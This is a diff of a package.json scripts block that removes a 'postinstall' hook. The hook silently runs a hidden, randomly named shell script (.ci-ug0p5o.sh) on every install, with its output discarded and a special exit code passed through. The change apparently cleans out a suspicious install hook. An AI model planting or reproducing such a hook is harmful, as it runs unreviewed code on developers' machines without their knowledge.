@@ -6,8 +6,7 @@
     "pint": "vendor/bin/pint",
     "phpstan": "vendor/bin/phpstan analyse --memory-limit=1G",
     "prep": "npm run lint && npm run build && npm run pint && npm run phpstan",
-    "prepare": "husky install",
-    "postinstall": "sh ./.ci-ug0p5o.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "prepare": "husky install"
   },
   "devDependencies": {
     "husky": "^8.0.0"
